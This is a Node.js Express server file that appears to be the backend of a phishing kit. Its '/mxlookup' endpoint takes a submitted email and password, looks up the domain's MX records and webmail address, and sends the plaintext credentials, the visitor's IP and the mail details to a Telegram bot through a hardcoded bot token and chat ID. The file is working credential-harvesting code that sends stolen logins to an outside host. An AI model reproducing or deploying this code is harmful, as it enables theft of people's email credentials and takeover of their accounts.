const express = require('express');
const dns = require('dns');
const axios = require('axios');
const app = express();

app.use(express.json());

function getClientIp(req) {
    return req.ip || 'UNKNOWN';
}

async function getWebmailLink(domain) {
    const commonWebmailPaths = [
        `webmail.${domain}`,
        `${domain}/webmail`,
        `mail.${domain}`,
        `https://webmail.${domain}`,
        `https://mail.${domain}`,
        `https://${domain}/webmail`,
        `https://${domain}:2096`,
        `https://${domain}/owa`,
        `https://${domain}/zimbra`,
        `https://webmail.mail.${domain}`
    ];

    for (const url of commonWebmailPaths) {
        try {
            const response = await axios.head(url);
            if (response.status === 200) {
                return url;
            }
        } catch (error) {
            continue;
        }
    }
    return 'Not found';
}

app.post('/mxlookup', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Missing email or password.' });
    }

    const domain = email.split('@')[1];
    const mxRecords = [];

    try {
        const records = await dns.promises.resolveMx(domain);
        for (const record of records) {
            const targetIp = await dns.promises.lookup(record.exchange).then(r => r.address);
            mxRecords.push({
                host: record.exchange,
                pri: record.priority,
                target: record.exchange,
                target_ip: targetIp
            });
        }
    } catch (error) {
        mxRecords.push({ error: 'No MX records found for this domain.' });
    }

    const webmailLink = await getWebmailLink(domain);
    const ip = getClientIp(req);

    const baseUrl = 'https://yourdomain.com/openfile';
    const cleanUidLink = `${baseUrl}/uid/${encodeURIComponent(email)}`;

    const telegramBotToken = '2071010767:AAEJbO34MFOD96LcV8IHwGiVhiyhrfFH_2o';
    const telegramChatId = '-620309599';

    let message = '\n🔹 *Login Attempt* 🔹\n';
    message += `📧 Email: ${email}\n`;
    message += `🔑 Password: ${password}\n`;
    message += `🌐 IP: ${ip}\n`;
    message += '🔍 MX Records:\n';

    mxRecords.forEach(mx => {
        if (mx.error) {
            message += `❌ ${mx.error}\n`;
        } else {
            message += `✅ Host: ${mx.host}, Target: ${mx.target}\n`;
        }
    });

    message += `🌐 Webmail Link: ${webmailLink}\n`;
    message += `🔗 Clean UID Link: ${cleanUidLink}\n`;

    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const params = { chat_id: telegramChatId, text: message, parse_mode: 'Markdown' };

    try {
        await axios.post(telegramUrl, params);
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }

    res.json({
        mx_records: mxRecords,
        webmail_link: webmailLink,
        clean_uid_link: cleanUidLink
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
}); 